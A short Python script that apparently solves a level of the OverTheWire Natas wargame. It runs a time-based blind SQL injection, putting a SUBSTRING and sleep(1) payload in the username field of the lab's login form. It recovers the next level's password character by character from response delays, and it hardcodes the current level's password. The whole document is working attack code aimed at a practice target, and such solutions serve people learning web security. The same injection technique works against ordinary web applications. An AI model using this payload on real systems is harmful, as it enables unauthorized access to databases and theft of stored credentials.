#!/usr/bin/env python3

import requests
import string

subset = string.ascii_letters + string.digits
natas17_pw = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
natas18_pw = ''

for i in range(len(natas17_pw)):
    for character in subset:
        query = 'natas18" AND BINARY SUBSTRING(password, ' + str(i + 1) + ', 1)="' + character + '" AND sleep(1); #'
        r = requests.post('http://natas17.natas.labs.overthewire.org/', auth=('natas17', natas17_pw), data={'username':query})

        if r.elapsed.total_seconds() >= 1:
            print('iteration: ' + str(i))
            natas18_pw += character
            print('found: ' + character)
            print('current pass: ' + natas18_pw)
            break

print('natas18: ' + natas18_pw)

